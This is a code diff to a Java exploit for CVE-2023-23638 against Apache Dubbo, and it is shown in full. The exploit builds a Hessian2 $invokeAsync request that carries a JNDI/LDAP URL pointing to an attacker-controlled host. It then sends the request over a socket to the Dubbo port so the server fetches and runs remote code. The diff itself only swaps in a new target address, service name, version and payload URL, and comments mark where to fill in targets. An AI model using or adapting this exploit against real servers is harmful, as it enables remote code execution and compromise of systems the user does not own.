@@ -12,6 +12,7 @@ import java.util.Random;
 
 
 public class CVE_2023_23638_1 {
+
     public static Boolean False = false;
     public static void main(String[] args) throws Exception{
 
@@ -30,9 +31,9 @@ public class CVE_2023_23638_1 {
         Hessian2ObjectOutput out = new Hessian2ObjectOutput(hessian2ByteArrayOutputStream);
 
         // set body
-        out.writeUTF("2.7.21");
+        out.writeUTF("2.7.6");
         //todo 此处填写Dubbo提供的服务名
-        out.writeUTF("com.example.api.DemoService");
+        out.writeUTF("com.pacemrc.dubbo.api.DemoService");
         out.writeUTF("");
         out.writeUTF("$invokeAsync");
         out.writeUTF("Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;");
@@ -40,7 +41,7 @@ public class CVE_2023_23638_1 {
         out.writeUTF("sayHello");
         out.writeObject(new String[] {"java.lang.String"});
 
-        getRawReturnPayload(out, "ldap://192.168.26.164:1389/mgpnrr");
+        getRawReturnPayload(out, "ldap://10.58.120.200:1389/nco5cx");
 
         out.flushBuffer();
 
@@ -51,7 +52,7 @@ public class CVE_2023_23638_1 {
         byte[] bytes = byteArrayOutputStream.toByteArray();
 
         //todo 此处填写Dubbo服务地址及端口
-        Socket socket = new Socket("192.168.26.164", 20880);
+        Socket socket = new Socket("10.58.120.200", 20880);
         OutputStream outputStream = socket.getOutputStream();
         outputStream.write(bytes);
         outputStream.flush();
